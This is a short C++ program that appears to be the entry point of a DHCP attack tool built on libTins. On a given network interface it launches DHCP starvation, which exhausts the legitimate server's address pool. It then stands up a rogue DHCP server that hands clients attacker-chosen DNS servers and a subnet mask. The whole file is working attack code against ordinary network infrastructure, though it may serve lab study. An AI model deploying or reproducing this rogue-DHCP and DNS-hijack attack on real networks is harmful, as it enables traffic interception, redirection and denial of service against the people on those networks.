#include <exception>
#include <iostream>
#include <thread>

#include <unistd.h>

#include "dhcp_attacker.hpp"


// Taken from libTins source code
Tins::PDU::serialization_type serialize_list(const std::vector<Tins::IPv4Address>& ip_list) {
    Tins::PDU::serialization_type  buffer(ip_list.size() * sizeof(uint32_t));
    uint32_t* ptr = (uint32_t*)&buffer[0];
    typedef std::vector<Tins::IPv4Address>::const_iterator iterator;
    for (iterator it = ip_list.begin(); it != ip_list.end(); ++it) {
        *(ptr++) = *it;
    }
    return buffer;
}

int main(int argc, char *argv[]) {
    auto err = nice(-20);
    if (err == -1)
        std::cout << "Could not set nice value." << std::endl;

    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " interface" << std::endl;
        return - 1;
    }

    DHCPAttacker attack(argv[1]); // enp0s31f6 vboxnet0
    attack.initiate_starvation(10);
    attack.initiate_server();
    
    // Options
    attack.push_server_option([](Tins::DHCP &pdu) {
        pdu.domain_name_servers({
            "1.2.3.4", "4.3.2.1"
        });

        pdu.subnet_mask("255.255.255.0");
    });

}